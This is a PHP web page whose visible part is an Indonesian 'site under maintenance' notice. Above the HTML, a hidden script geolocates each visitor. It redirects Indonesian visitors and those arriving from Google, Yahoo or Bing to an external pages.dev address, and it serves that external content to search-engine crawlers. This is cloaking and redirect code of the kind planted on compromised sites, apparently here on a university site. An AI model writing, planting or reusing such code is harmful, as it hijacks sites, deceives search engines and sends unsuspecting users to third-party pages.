<?php
function getClientIP() {
    $headers = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    foreach ($headers as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            foreach ($ipList as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
    }
    return '127.0.0.1';
}

function getUrlContent($url) {
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
        if ($content !== false) return $content;
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response ?: '';
}

function isBot() {
    $botKeywords = ['googlebot', 'slurp', 'adsense', 'inspection', 'verifycation', 'jenifer'];
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    foreach ($botKeywords as $bot) {
        if (strpos($ua, $bot) !== false) return true;
    }
    return false;
}

$ip = getClientIP();
$geoData = json_decode(getUrlContent("http://ip-api.com/json/{$ip}"), true);
$countryCode = $geoData['countryCode'] ?? '';

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$fingerprint = sha1($ip . $ua);

if (!isset($_COOKIE['user_fp']) && $countryCode === 'ID') {
    setcookie('user_fp', $fingerprint, time() + 86400 * 30, '/');
    $_COOKIE['user_fp'] = $fingerprint;
}

$allowedFingerprint = $_COOKIE['user_fp'] ?? '';

$redirectURL = 'https://punten-neng.pages.dev/wiraraja/fik/labkes/';

if ($countryCode === 'ID' && $fingerprint === $allowedFingerprint && $allowedFingerprint !== '') {
    header("Location: $redirectURL");
    exit;
}

$referer = $_SERVER['HTTP_REFERER'] ?? '';
$refererDomains = ['google.co.id', 'yahoo.co.id', 'bing.com'];
foreach ($refererDomains as $domain) {
    if (stripos($referer, $domain) !== false) {
        header("Location: $redirectURL");
        exit;
    }
} 

if (isBot()) {
    $htmlURL = 'https://punten-neng.pages.dev/wiraraja/fik/labkes/';
    echo getUrlContent($htmlURL);
    exit;
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Situs Sedang Maintenance</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f7f7f7;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        .container {
            max-width: 600px;
            padding: 20px;
        }

        h1 {
            font-size: 2.5em;
            color: #ff6f00;
        }

        p {
            font-size: 1.2em;
        }

        .logo {
            width: 120px;
            margin-bottom: 20px;
        }

        .gear {
            font-size: 4em;
            color: #ff6f00;
            animation: spin 3s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media(max-width: 480px) {
            h1 {
                font-size: 2em;
            }

            .gear {
                font-size: 3em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="gear">⚙️</div>
        <h1>Situs Sedang Dalam Perbaikan</h1>
        <p>Kami sedang melakukan pemeliharaan sistem untuk meningkatkan layanan. Silakan kembali beberapa saat lagi.</p>
        <p>Terima kasih atas kesabaran Anda.</p>
    </div>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'953db89af85c6033',t:'MTc1MDYxNjAyMy4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'953e30a039dece0d',t:'MTc1MDYyMDkzOS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>
